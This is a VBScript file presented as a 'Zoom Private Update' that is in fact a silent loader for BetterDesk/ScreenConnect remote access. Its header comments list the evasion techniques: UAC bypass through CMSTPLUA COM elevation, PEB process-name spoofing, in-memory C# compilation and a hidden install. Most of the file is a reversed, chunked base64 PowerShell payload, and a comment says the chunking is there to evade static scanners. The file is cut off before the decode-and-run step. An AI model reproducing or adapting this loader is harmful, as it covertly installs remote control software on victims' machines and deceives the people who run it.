' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.0.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "wkGb1JTSwlHdLNWQrYmTUlTdrRTd0NmY6RlengyZulmc0NFN", _
    "5UlWnNUQ0sUTHhWUHplQLhUMPlXWudlYQ9EdPxWRapHapljb", _
    "FlkYrdUYntiM0ckNTRUYDFVRTtiQ3sieZplVpRkWBJnMu9yT", _
    "SBjRzsWOsdkdwpFWGxWVqh1Z0EVY4gnSXRDUQhkZxI1SxQVb", _
    "LNzUvZDaJR1YndWarpkawZlUw0kUZRHTuRlUjlTV1RlMxgFb", _
    "iJnZBRFV1V1SoVnMWBHUZhGRFtSaDZEeQd2RlFXcDJ2ZJRle", _
    "XBVe2sSNNV0U49yLjhTZ28GOadkd24GbFNGWPpFS0MmbYRES", _
    "rwGaDFlRrB3T6xGandWUvkTN0RleQ9SR0hESuRGb6B1ZPxGe", _
    "ZF3YoxkQVpXYvd1b5lmY4EXQiVlbuFEb1V1TQFkVTdWOKdGV", _
    "vNzKJRkS4ZEaDhmeUBDV4QXe2ETdyIzYihWe6BXNyhlM3VVS", _
    "2AHNtdjcxhGbTlTT6tyL2EzNoFjdQNUUEpWSEtWTwdlTBZzZ", _
    "uBTO3k3ZvcDVodTQ1M1TTZWO4plMwMGb5ckTl52ZVp2TkJVe", _
    "YNFbwdjVCZkdvE3bIVmVnxUSWdUdhVjZIhXUa5kSXZza0F1a", _
    "VJkZp9yL3VkRJtibNFGardlWqFGWEFGZzInZ1Z2YtFEODdzd", _
    "rcVRYJkQHBjYtN0Uah1LZRGMmdzRydjcEhUW1p3ZLhWRENHd", _
    "OlDcoFjZvQWdvUGSjJmb2sydhZmd5AHdkVnYUVHZ3AHRBhXe", _
    "zYnQykHaIh1NIJzM5cDcrEzLCh0YptCU50WdPRmdEBjN4FjN", _
    "GdEN0ZkTWpFMxc0dyNEa5Y1KnhXNzZUdmR3czEzMzMjNysGV", _
    "JdGehJjemVzT2VWNKNjWQJlZQNEbzc0L3I3drF3cNNmZzNkR", _
    "4NDUZpmemRGZrcFMq9UZUZ2VLhWRoBVbDhWUFJDeNlFeX9SM", _
    "kZWV30WdvkDU0UGSjd3VzIjNwsmN19yZhRmb3YXZkVHd5YGW", _
    "GFlaXlnNLhWclJUSo5mVo1kSD5We2pXOJl1QYVkRXVVOM50N", _
    "zZkS0NFUChUNiVjNnRDSFNUaW9kcRd2cit2LH1EVGp2ZTpnZ", _
    "wcGVzgEcIREM51UNwcWY4wUQIFzVuBVR4g3byFza5AXRYFUb", _
    "aZ0Zh9UehFEdD9EdrYVQoN1ZmVFTBNTSSZmYIVzVxFEVNdUN", _
    "ER3YVZGVSZ3Q3dUYVF1VOFlTRRzNuxGTTl2KVt0Tr8EV3Y0L", _
    "pNjbHdFWYlUUKR1KtFVcVh2by9iSohVT4EjepBlQwUTSltyd", _
    "yEnbzJVb282Nad2dx8mZ2lGdvlVawoVeQh2R6pWez8SY1t0b", _
    "tNzNzFHdCtGZshUePV2N0Y0b0s2avJnQtNFWNpFO5J3KqdWZ", _
    "BZ1V2B1RspUZIJUdpBjW2wERzcTcFp3NlVGN0h0dy8yQON1Q", _
    "1RjaR9kePFVYxVlVndWewwGc1hTdMZHe3hkWvxUMqdDUrIDZ", _
    "vsmbCh0UxF1QvgUOTljTXhlZhBHN4VzK4cETG9Ud2siSyYkY", _
    "K1EVYdXZYBFUKFHdPNkNDRkbCtWa6F0VMZHciZ2L1NENwxmW", _
    "yd1b3ZlQlZFRvgEMLpHOxM3YBVVeyVTTMdlS3FndRV3S59ib", _
    "4InYEBlW5g0Y0I1MiRGSxJEZmtiRlRDZmlFRk1EdplTawE1b", _
    "tV0ZLFkSGpHTYh1TLdkSBFnUxQDO4JTYEpHZ3EzNiNmaq90K", _
    "0Q1T2IHN0VkeD9yZIZ2bx8mQSVkbxIXTlZmWr0meZBlUNF2K", _
    "QRDeNFDU31EWidzUjZzYNNzN1okZzFHW0d0MXtkNjhWcPN2K", _
    "XVVRlZVQnNkU1k2Ux4GVnBHWzhVMyIkZMJ1V4c2RFFzY6NWT", _
    "3IUO6NWMYx2czZGU5x0c0tUUyAFS2EVVGZ2YYJkQWVTOGpWR", _
    "yxkazEHe2ZEcPZ0QKdEe3lWbhNTOOBVM3VmNrUUZ4NjRxZnN", _
    "lhjT0IEbt1GejpEMWRkSplEbINESykTRUdWb1N1clBTV6l0Y", _
    "4ckT4cURl1mVoN3Y6Fnd542bjd1aEBzTHNXUpl2d2ljRCp0K", _
    "vsWTKBTQTZXendUSrUWO1lkNCRzMBFlUDdUavtkZRJ3bwIjM", _
    "yQkQIZnMGB3UV10V1FWOoplZaJDZYpXV2IHa590TVRUUNF1c", _
    "LtySWNHVWhUZ1BDeLh0audWSrZncmhWUEJDTZ1kNwYGeuhTW", _
    "0kEa40UVXFnWodXOwJlWrY0NrJXb1JkW1QWdORFczAnehVmQ", _
    "5QXWnhGeoBXS1RTePh1LJNFbL52ZzFXOjRzMhZEN2JVchd0S", _
    "GJEWR1ER5IUOFV1S3lUMMJDUKR2S0FHVBBlUm5kZwIXN18Ga", _
    "odmb6Z2cLdzK0NmZwt0SvZVW0JlMvJFdFNTeBJ2dWlXaU9CW", _
    "Kl3aah0Sxp0aHxWVolUOSJVYnhjZltSYW9SbWhEbpZ0cMZ2R", _
    "rQUZxNDWz9GNvB3aPRHdttyKvgUeRZWMxJ3RTd0KRpETpZnZ", _
    "LB1YOdUU3djQzpnN0UVQzRUZQRHdPF0SIhTYjRGbUdzdrh2Y", _
    "jREMpV3dRljU3V2Q3hGe4ZXWMJXYCN2bxpUawAHa3dmW4RVS", _
    "6FGaMl2dyhVbv4UbOZESxREROJDcnhUSyBjUrkXSkZ1RKBjc", _
    "kJzRmJTcmlzKSZGTBJVOlZVS2E3ZDpEROhVaCtCej10SQ5Ub", _
    "URGUTRkeFlmaV1kQuZkR4ZkWPBFNs92KTJnd2d1ahlzZlNjN", _
    "xFmbOtGe2Vlc25EM1c0L5x0L0UDWjNle6RUVZlDM4pUaydFT", _
    "mVVU3lVe2VGSqtERx5GR2QWR1RXcnZkVNlWaM9UZQNENVNzR", _
    "lx0cxZEUPN0TVpnbt9WUExGOEZEZn9maQJ0a2ZFMVhTYTNXS", _
    "WBlNENXa5pmM1QkMlx2KjFlZuRFSilWRxtiVoJGUXFFWQRUa", _
    "zNlS5EWNPBHeNNWc3p1d0RTaMVTdUZ3KxIXYpVjUIdkcDljc", _
    "FRXamlTZvhVWa1UePFkSzUme5lWOBhlW5llSzI3ZTZ0VxNHe", _
    "opkdKRmbNN2dYF1T4VVWDVmRZ90NI1mW49GWxlHZLZFOFVVc", _
    "DNXMxYWSxE0NYd0SrhWeNFTQ0kHd6VXbKllcVBTOuFkaVhmb", _
    "HVGWktmTrVFMzR1VwM2amljSPp0bUFkY2MGbRN1SRZ0UKZlT", _
    "lhleJJGU452Mxw2ZpNVepdWRTFTcwkGR2hWTyBjcnJHckVkR", _
    "11EeuFHRDpUbQtie4YVSMp3VNBFUwp3VYNnTKRFdycGMYZkQ", _
    "10EUwZleXtkSLZWSG1WMTBXUFBjW1pHRwM3cEZETW5EdKdkT", _
    "6VzaGhzRxJkREVjQStmMsVkT2sEThh1SYhjMRpXR6Z0ZypWS", _
    "X10ZCNHZxkDeB9WSLlmYIpkcWl0LpVkUtpGeINzLilEZygnM", _
    "PVWVxw2br50VLd0dTF1d09SbmpGdXZUd2hXeRRGcvolZj5WN", _
    "ZlTcwQmSRNVcDdDa1l1Qw5kRNJjRRRzLadmd6hzY5onU6R1R", _
    "4pFN1YnSrRHMDlTV0VGVZBHd35UUsRDSCVTYaREdmdVc4EGM", _
    "sZWczM0brJ2RDVVWVtkbXFHUNp2L1oWV5UnZ5cmYrtmZIlUO", _
    "hZEMnVTTuJ1dLp2Zxp1alBXO5ombkdTZ5ZGOhtGdkZ3d5U2b", _
    "4VHetlUMExEVyk2MEp2M1N3YOFlZIZHTKpkToh0aPFTVwsyQ", _
    "KBTM1pncTREVFBXaEFkVQl0SatidhFzT0I0L0tiUYZEVtNnW", _
    "ohmdGhESrlmc1h2UERWQ3UEa4ZmbY9Ec5NEZMBjV14WalNHS", _
    "uhFbxgUeKJ0S2QVN2ske5pVTO1EVuVldpJkY5kmeKBnNGl1N", _
    "6BVe0ZXYjNnY2BFN0YDbvIzSMtSYqB1UZJHTyllQxIEaMBjV", _
    "29mTPNUO1ckctRUb2YUUqNGR5Q0axpHarFFWPJEepdVTUJWe", _
    "kFnZ2MzKCZzL1ZjdmZDaIRzaE1UaPJEVBVUU6REdVZGexgnM", _
    "a9ENXFVNKFGWXNUTqRkTrJ1Lv8SOyEWZaZ2LxJmb2g1LId1N", _
    "pZWZ3hFe1UXVr9SRh1Ue5E3Vv52RBZVOFVEcVlFMyFUOtJGd", _
    "wZHRkFTNz8SZqJkT4B3RtBzcS9yb0h0ZHFHRUNVUMRlRnNHO", _
    "rUXaSxGd5pVTjhUNChlb2B1bYZUWYN2dhdFZSZWY5IFU1Qmb", _
    "WNUaiRHTxx2dhVUdpNzYpdlcxhHbUFTYZRVMxUUZBZ2aGdkd", _
    "CljVMxWM3FUMVp2TklUOPpncDFXeiJTVxoHUDRFaFJkYNl3M", _
    "MJndEF1QzBFbvJncFJEbzBVWvF3Uk50d2JFVThGMyMWMVFWQ", _
    "PhFUklUZm1kTzIlYihFZ6pESmdGSvUjYwB1TtZXMCx2ZkFUR", _
    "qBjR39iNKBXWyF2SS50av9GTVR0dQJkQEhlM4I2QBlzUnBHM", _
    "000Trp0QzRURUV0LwglSzpGcyMXOrNDczMkVT1mU1QWVJFUY", _
    "ZpGWtVlettGb0sWVzAjaHVzY59mYvJVQTZlT6xEaTRmdUplR", _
    "Ql3ZmpHZCtSaxYUdLJjaFBnRTNVU2UERWZVSytWTrpGOzV1K", _
    "DhzU2gTaykVN5YVY6FnVTlXVUJTRLVlbKhXOYlXQzcXZD5mS", _
    "XJzSN9EcFpHeJ5GNIp1UDpHNDp3a2JDd5xEenJ0aWhjNU10T", _
    "1cjQalWSrEGWLFXe2UkYysUa1hUUK90QNRkc0RUTJdXUJRWY", _
    "LdWUWJ0SrlVQuRzdSFVMx50KKhlSyFTc4EkMyNETkBnU0knS", _
    "yRmbiZVRtRnQVVjUsVGd1QkcJhVUGpHOkp2RjN2RTRlewAFR", _
    "DtyR4tEdqdTVKRHbiJXVWVDRZ52aklFUphWTv4Ubmh0aMR2M", _
    "rp3KMJ3ZxAFW5UVeap2SHFWYtF2V0dlT2UGUxFzZvUWdhRTU", _
    "z8SN3RFMIplcjFTUGFlQ0kWZWpWcwx0Q4MXWzk0aYdWYCBVb", _
    "xVVdGpnUIZDNvYXbTNzLEZVM0hUMqFkSnNXODB1bZFXS0oHe", _
    "wc2dnl3KDdnTQJ2cq9EcWJUbhJzKCFETGB1KX1EZUN3L1lEV", _
    "DFEcnl3THJDdBp1Q3B3YZNmeq9idzIjZuVHdMt0cvQVe5UTY", _
    "pNTNkd3MNJjVHZHek9yVw02QORlNqx2colEb1l3MJZnZypmV", _
    "RRWd6ZmWFVTTmhGZ5hERwVUWZdDSRVTdxs2dzUnYPFlNpNGT", _
    "ZRVbENWaVNEakBDMx5WeDZ3aad1cUh3KxpVSuJUaUNEV0sWN", _
    "xdlTzA3Vt1UciF2bXBDWhBnb0NldrBzTz82d3kXah9kVCpWe", _
    "GRXTqBVNnRVThhndiVFSWZ3MSlVOXtWUId2VxVmUKlkcxdEd", _
    "rVlQ1IWdZBXQVFFZ5N1YQZnbw8mQXxUThhHSDJ1aYFWYkZHd", _
    "FJzcWRnTxcWUDZHT0NUUoFlZ3Z1MjxmchZ1NQFXMsRHM2UnR", _
    "3kGdkBDcotUOzJjZ6ZnR0FHbklzZHJDVlpXUElVbR5UZSdke", _
    "xBXZzQHWVJHSGdzU3plVGd3RXVmVMhzUWRWMtVXOhNDO3kjN", _
    "rBjMQJ1d5EFVIhkNSljTsJXQ4lVeEZHaa90auJ1NycDSvwWR", _
    "YVVV692d5UUWalWQKJmWrMWQa5GViFHdJJ1NpB3RKB1d10WS", _
    "Kd1Rk90SDt2Ruxmc5llQQ5ka1UTYrdlMQtUQJZ2Zll1T2MVT", _
    "NZnMHlkMn1majV3TW5mSRRlTRlzMLJjbuVXaJBjeQNkaF5Ue", _
    "RR0cpp0SYF3MGJXNLJkRGVFcTBVcadHazEDcIR0UBNmMwdUa", _
    "wFEUCJkZvFlTKpWbRVzcyZXOnpUV59yS3ljaRpURJ9iSodkN", _
    "xF2SyYTcHJzRZdGMRtyRmNjVUNTaNdUTzgjVzZHbNVTbvJke", _
    "z42bxUDcCZEc6h3RvkzR1R1d5EneW1mRTB3YupHN0tkS1dFT", _
    "ClVQXZFMLl0YG9yZ3k3YDZnasZVbPxGSKNGaT1mRCdGSjJ0T", _
    "SJlSshHdvRVO3cGMmVTSuxkeNVjWrgjN1MjSRJ1L2B1Y4gEd", _
    "ph2VIN0RRxWVp5WYupXTnZ0MDZFZLZXWDR2NWtmWa52aTx0K", _
    "YBTQOFTaXVkc6BXa5ckN0UVUSNXS1JzKrZDdLNkRv1WQOl0L", _
    "OZ1ZLVXT3QUO69mWKhka3RHbxVFMkFUdnFjaoF3TPJzYC5Ee", _
    "sVETEF0Q1Jkau9CRqNEOsFGOzN1QLN3S0cTQRVkTrdlbqZFT", _
    "X1EdEdkV3gzcrJXc0YFWxdnT3V3UsZVTLNVShdEUW1mSEJkU", _
    "wIDeR9UdklnTDBlevElYaV3ckJkURVnTjJzK2kkSkJGShBTV", _
    "m9SSEJka4ZnStd2dTZUW0dmT2V0Y2FGWxpHSwIGdwNmT00GT", _
    "URmWyYzSudzQCxGSOFjZiJmevp3UDpnYwp3ayMFSS1WbxInc", _
    "HJEMGNzZzRje0NDWyBzK0E1RIdTc082R28mcpFVUkhlaEpmN", _
    "Vh2SrMmZ4lkRhBzQUFUR4lkY4YHOzgTU3hWRxY1VEJjUyo3c", _
    "kRXUipEMDFFVzY1bRJlc3EnY1N2ZNRWTExUQGJXdN5USrJ1a", _
    "mhVOJ10VyF2YyFmTVNGMqhVTGR3b4R0M4IlZGlDUuNHRoF1K", _
    "5F0Q2AXQzJFMWRUcyhHU2A3YwcTYVNjY1dTcxtyNkpmR5o2M", _
    "FlGTJdHSzN0Zw1GOUFDUxoFTMp1Z5cFc6p1LwEXQjhVRsZlN", _
    "0IXdu10Szp1Va90btNHVS1kUFZDTTF1a0gTQqt2cvljNqBHO", _
    "rEGcuRTbJZHRRdmVrEUQXd3RwcmR5MVbHdVeBl0Qz8mWSVlY", _
    "4RVNtJHbzNGU1h1cttmQGtUSrUVQ1lFOlpHVIF0b4VncYF1Y", _
    "0AXaWR0YZJ0YaJ2boZ3Radlc58GV0ElTYhzSw1GRLtyYzZTY", _
    "TdGMEd2bBFXQCV1V4d3UUFWc4VEWFNUZmB3UoVnajN3S082c", _
    "plUdzRzY4BHUzAXSxNGUiBzV1E2Y0U1SLp0N4wWUOdEW0Fnd", _
    "wATUu1kZ6JTTYhEVzNnSGp1UuBnYnBzRLt2aXZkbWRUN2g2b", _
    "2Q1T1dUYxNFUCF0ZJNGVvgzTz5EZuBXeMBVNvh1L5pVeFJFN", _
    "UdjUnlTco5EO2EjYyIGcqtWMNplSRFEauVVclF1aEJjRURne", _
    "5sWTTxUU5Z3KPx0LaRjRLNEcww2Vvl2VFVnS4xkRhlUT1RFT", _
    "4UVVwF1KipFTNR1c39WeMRHTIJjeG92TYpGWPd0NCRDO5VXU", _
    "NZkQ4k2USN3b08Gd0cjNLhkTx92M3F0QpFGbUtiY6FVMm9iZ", _
    "0IDOGdGNKhGRx9yKyczMoRzQnNzRqB3VVFTWCNnMOd1RN9mU", _
    "u92N4E2ZQdUWGVHNrIWeWlkbp1GcyomcidTQBZkUF1kYyVle", _
    "3ZkMOh2QSJVSEBFOvglNQVWcD5WeIN3Myp1RG5WR4MkNINzT", _
    "6tWbxdXR1h3U4wEdQJHU41mRrMleaN2N2EDMSZXU3JTYQFFN", _
    "ylHOSN3Sv5UYNtmUzgVVWl2MXRXZUp0SGpkNHBVdxpmMnNFW", _
    "rR3UnhVajpWN3MjWIl0TBNEMv8yKhpkNoBHbMl1VV9yNF12L", _
    "woXYZdTcmFXTK12T1hHNUdTNstEOyk2Yxw0cXt2Y6p1RnR1S", _
    "ZZEZm9WVvw2aCN1ZJVzLhBzNORFcwV3LzRnYkZ2VvJ3TyhkR", _
    "voVU0RkbRpXe6dUcndWY5AFTtNWN6tCcEJnMld2TCNXZNR1R", _
    "ZBFWzgFWxoFN5BnVLxGZMVXa4NzQvhFVOZlRYtUWqtSewNjZ", _
    "ThDTwQ3YtF0ZkFFWS9iQ2xUQldXc40UV5NGW1ATaWV3N3gGa", _
    "xNWevYERo12UUBjValWOORzUyMzM0NFONh1KzkXSVxmYrJGd", _
    "ndUWtlHM3pEWrcmNDlmTCJ2ZB9SUWlFdTNTc0U3R5IEWPlWT", _
    "WFndV12aapVZE9WbQZlRrcHSr8UdFVHV59COygXRoFmWXBDe", _
    "ah0V2klY2AVRy9yVq9ySxgGRtpFRzgnarhnTVRDejtmcINzU", _
    "UdXRxUlRnR2b31GNYRFb1sUZ3gld2NjVitCZCtiM09iNkhkR", _
    "jdzQHd3U1hGMWl0K1VVS5tCOwUVVxRzT1l2ZH5mRMN3Yv8mZ", _
    "qJDd3MFN292cFZVcv4Gewg3ZDlGbzgDc19WUZpWTq9kUFp0L", _
    "YN0aNR1YpV1Yrh1SrcjWLBXSXBzcHBTMSRFWxsmQCB1cDVXc", _
    "DB1Vll3RxgUSj1WNoVTZiZWS2d3Vx9We1hzYsR0Nw5UTK9Wd", _
    "ntSV3VUakxkcsZUdqlkaXB1KJZHNhhXVmdzVNljVT9mbH9iU", _
    "NhUV2ZFVItyMMh1ZwNWMIdzUWNGOCdjZzFmMlRUYvIjVvo0L", _
    "vFDZPJFZShTOxkGTzpleE5kWx1WYJVGTIdGTwpHSMZlYi1WU", _
    "mVHePJWWmVDa2YEWrcXe6VHN5dWb49kQw0mRhFEO1UVdysUR", _
    "hFVdHVFM1xGeFZ3QzdTUjxWRNp3aFpWYitCOSlTVOFVR50ma", _
    "4R3S0F3T44WMxJmURF3clVlUxhjWrkGOLp2aRdFSHtSdpVlS", _
    "xk3VhhXeNJWVpJXTRRDVo9yNzd1TwI3QmJnbC5UbXVzTmhWb", _
    "up1VJJmNUhzbxZjYSFWbCd2V3dXMmhkZEd1SxEGMTZVZKNjS", _
    "o1maPFGboVHS18kRyRncqtmQ3NnRTJEewRkWVBXavRUc5oEM", _
    "FNneSZ3UrpXOqREb5kGc1B1SqFWMlFGTklkQvJXRChlV4t2Y", _
    "C9WMwcEN3MHWONGbaNzSCVmbwkERDN2NoZWTwg3LmhnaZ1kY", _
    "BhWR6lXMqFTUp9mRvEFasF0TY5kQvhTURRUbaF0QkFzTXtiS", _
    "JNHM092RuR3bNFzcycEUNRkUzczURNEVr4ESv9yVvVFehtSc", _
    "5oHWyMHdxIFUHNjYQFVbpJ3dHpUMjZmUI9iM3x0Q4J2cVZ0N", _
    "wkVWUVGNV9UMa1kWXZHVat0MFJnT4dVQvsSaqpGO1MnY1JGb", _
    "RpGd6h3M1k0d3dzd0o1S3RWbJFWVs9UMIpnMElESrN1UnR1R", _
    "2oUMxJ3VvY0ak9yZFtiNDtEUrwEbGFTU3kFZ4NXVMBDWI5Ua", _
    "TlFRktWYzMTe08EaxQ0KuVHSzd2YF92RjZTdwZnR2FzTVhGR", _
    "SlFaoJmRNVnYRFWZ6ZUUhVERTl1c6N3RykEZyYnamhWdPl0L", _
    "vcGb2pFdvFzS5N1bxhjbCtmd2VnZj5mTxcGVPJmRrRmUzglQ", _
    "FtGaXZjYDJmMyp3YCdmY5o0MYVmQ3lUeyFEeOR2duZGcU5WT", _
    "IBTVBdGNapGeyxWa1gGZ1VXVsVXe4k0T3QnR0c3cHljSYR0N", _
    "3p3NG9UbvgVTyUXRBh1Y3pVT5RkVvQHeCRHcIx2ZtV1cMRTd", _
    "UpGWW5WbGRWTZdjWxhkSkdFdnpXQGNnSkdUNkZnY3UVSs5Uc", _
    "L5UV28mWL9mRJVTN6lDWrUUVyInYW5GaNRDRYdGSvIXRTtSb", _
    "HlUR4RHdK5UZkllZ6FDdaN2MVlTZqdUUoZFS0YWRxV2b0cHM", _
    "xEUavJndSFUS25GZShzcS9UeHdEb2cTU15kWrh3b29Ca500U", _
    "0E1bXJUUaJTQp9mNwJWMpRXUJJDa1IGMpJTOCNjaUFXQTNXN", _
    "5MUS3p0dhJ1VVVjQQVXQGdzYy8mc1ZTcZ5WVxg1d5IGTkVTb", _
    "GdkeIRWcsZmT2wGbRJnanN0ZphGVFdUNY9UMhtme5QkZxdjU", _
    "p9iaopHcpx0KEF0VXl3ZN9mWjBjZlpXMvdVTxJERNhzbpBDd", _
    "plEUUJVRFNnSrI1KYNHT5ckUoZTeDxUM4hDVWZGaFF2cQp0U", _
    "pNkRyMmNDpENzp2dyYlQ5U2KEtmTxU0KV9UNPhTOykFb5cka", _
    "KxGTEplYhpVTvR3SQ1EcyIjZMFGVvdEa1xUUaZnUKRlNxYEV", _
    "hdWUTBTeTplZ0IHbvoFRHRHdrEmQkpXYhZ1VFtWW6pGdwckc", _
    "a50byFUZxlkcRVGeqlWWaVEdVNGajRHMHNHO4QjcnVXcvg2b", _
    "BpUVzQ0KlhHMvFXVCFWaupVcURzS65GN4NVVzkEUIhkbFdFN", _
    "zBXbtx0ZvN3YCNzS4h2LpN0Ln9GNrhmbDlmNHZGSXlGT2kkM", _
    "phTY1JHOjhWRBVkV3xUVyQXZrYHShR1YJlnN6FFRvRVSnVGc", _
    "MVneklzbCR2bjt0VjZDUNZGbTVDUyZzLwQlSXBndXVkdWBTN", _
    "llUNsdUeo5EONREVOVWTk5EaFlVQ3ZUclhXehZEU3hUWw8yb", _
    "3RnMzRWcG5kZzQUMwAneJR0RnNTNhp3avtCOyEle0VUMxBXY", _
    "5FUS4okRCl2bPtieIRUdxgUYysGZkdDe30Ud0JTW6F2cNpFe", _
    "kF0N4V0d5w2Y4Y2YvF1NVFnT5oXU61GdW92Sy9mdFZUW4g3K", _
    "Q52Y2QndvYnN5x0T3gzM2ZDUPRzNY52YBRkWvcTR5xmTOBFT", _
    "NNlNypXQulGUPR3NyYGO19GRs9mdI92Lm1GWIB1LvYHUmZzN", _
    "IRkYYVzQ2VEbuFzbtF3anNGV2Y1bX1kZUZFRSZnQz80Nuxkc", _
    "yFnem12ZlljYlJ2byNjYjd1L41UQmp3L5NHRn9SMsVjeQFHO", _
    "5lWUvFnaPtmM5dzMIl0QY1WdJxGOrpleTRHdEJETklzY2Vzb", _
    "nplQhRGcjVlWhx0KXNUNwJzai52TKNHMxoGUiV2T1EWNvAje", _
    "JVkahp2VxQndCRlTadUMFJTUYJzSWdkNHZ2Uih3VjhleNBHe", _
    "uBVQmd1d1gGTrkVe4QUcLdGTsJXN6lWRRF1TyQjdZFDMJpHM", _
    "QF0RjZGa3plZa9mSmp2clZGZ4lHdUVXMiZTZ310MTp1TzknU", _
    "a1kZ0VzZ5dHW4UXdsV1Y00keadGMudEdyllTu5Ee1Z2dwdXN", _
    "rFHOMtCd4cjZ0MjU5w0SaBHUjN2VnRVNIl2cxNVclhXSY5WV", _
    "Ul1crUFazZzY41UYEd2LRl3R39mRoJmS1FlMR1me25GOhFlW", _
    "CtkTEpUa5dle2xkMqplM0FjbyxWNLlTUZJzaUZ1TOhTekxmQ", _
    "0NlTiN3Q3MHWNJVQw8mSG5kZ1FVQGZEVn9iaHVUVoNTQxBzL", _
    "CBFWyJlVLh3K3J3ZvMkbKNEVLl3LKNXRXVVOHhHU5MXUG92Q", _
    "W12b6BlcOlTNxBjUk1Gb2gjNtFTT2NVSwVWMqVGO0kjYo9WM", _
    "gACIK0QKnYWOQZWWzUmcBBTcZ1WamxGWVZjQrJ3RXNTOvw2R", _
    "yR3U5J3btVWTu8USgQ3YlpmYP1ydl5EI9ASbhVmc0NlenRCI", _
    "lpmYP1ydl5EI9ACcpp3ZkACIgAiCNkyclRXeCp3ZkwCKtFWZ", _
    "Tp3ZkgSbhVmc0NVZ0FGbmVGRu42bpN3clJHct92Qu8USgQ3Y", _
    "v1kbvl2czVmcw12bD5ibvl2czVmcw12bD5yTJtFIs0WYlJHd", _
    "tcXZOBSPgIXZkFWZyRCIgACIK0QKzNXZyBXbvNWZEpjOdVGZ", _
    "uQHelR1WgwCcpp3ZkgiclRWYlJVbhVmc0NlLPlEI0NWZqJ2T", _
    "hVmckASPgU2YyV3bzRCIgACIK0QK4YEVVpjOddmbpR2bj5WR", _
    "lN3bwNXaE5iclRWYlJHJgACIgoQDpgCZuV0bURWYlJlLyVGZ", _
    "vB3cpRkLtFWZyR3U6dGJgsTKoU2cvB3cpRkLwlmenRCI7kCK", _
    "vNkLtVGdzl3UgQ3YlpmYP1ydl5EI9ACcjRCIgACIK0QKoU2c", _
    "goQDzJXZ0VWbhJXYQJXZslGct92QuIXZslGct92Qu02bEVGZ", _
    "gACIK0QZ1JHdkASPgkncv1WZN5WSlRXYyVmbldkLwNGJgACI", _
    "gAiCNU2csFmZkASPgUGbiFGd1NWZ4VUZ0Fmcl5WZH5CcjRCI", _
    "nsSZ6lWbpRHcv9yJg0DIz52bpRHcPJXZslGct92QuA3YkACI", _
    "sRmLlJ3bD5SblR3c5N1JscCbsRmLtVGdzl3UngCQgACIgoQD", _
    "uQnZvN3byNWaNdCLnwGbk5Se0lmc1NWZT5SblR3c5N1JscCb", _
    "gACIK0wegQ3YlpmYP1CajFWRy9mRgwHIpcCbsRmLwJXYoN1Q", _
    "uMXZpxmYtV2czFEZlNmblJXZmVmUuA3Yk0FZp9mdbBCIgACI", _
    "tcXZOBSPgIXZklmdvJHckACIgAiCN0HIgACIK0QKfRCKkRWQ", _
    "yBVZk92QwJXYoN1QuAnchh2UD5Cdm92cvJ3Yp1EI0NWZqJ2T", _
    "w12bD5iclRWa29mcwRCI9ACdsV3clJHJgACIgoQDyVGZpZ3b", _
    "NkSZjJXdvNHJgwCcjRCKlNmc192Ut9mcGlHbi1WZzNXQlxWa", _
    "pADI0dWLgQnb192QuMncvJncF5CdsV3clJHJoAiZpBCIgAiC", _
    "lJ3bmBCIgACIgACIK0wJnASPgQHelRHJgACIgACIgAiCNsHI", _
    "rACd4VGdkAyegkycy9mcyVkL0xWdzVmckAibpBSZkgCIoNWY", _
    "gACIgACIgAiCN0HIi4GYyBmIgsCIpgyZulmc0N1bU5SZkASP", _
    "kACa0FGUt4WavpEKoQHelRFbsFUZ0lmcXpjOdVGbpZkLPl0W", _
    "lRHJgwSKnc2bs5CbsVGazJXZ39Gct02bvp3JgAVTFRlO25WZ", _
    "wlHdkACIgAiCN0HIgACIK0gMgQXa4VGIgACIgACIgoQDpQHe", _
    "lBXeURXZH5SesJWblN3cBRWZslGct92QuQHb1NXZyRCI9ASZ", _
    "uUGc5RHJg0DIk9Ga0VWbkACIgAiCNkyJyVGZh9GTt92badCK", _
    "6YnblRCI9ASZk9WbkACIgAiCNkyJulWYNdCKk9Ga0VWT0V2R", _
    "PxGb150cJpjOddmbpJHdztFKgYWagACIgoQDFR0TN9VTP9kW", _
    "9ByJsxWY0NnbpdCI9ASZk9WbkAyegkSKlR2btRCK5RHctVkc", _
    "lpmYvdCI0NWZqJ2TtcXZOBSPgM3ZyFUZr9mdulGJgACIgoQD", _
    "ulmc0N3Wg0DIdBzWzdmcBV2avZnbpRCIgACIK0QMgcSXbR3Y", _
    "ulkLk9Ga0VWbkASPgUGZvNGJgACIgoQDpUGZv1GJoAUXdt1Z", _
    "bBCdphXZgACIgoQDpM3ZyFUZr9mdulGJgwCbsVnbkgSZr9md", _
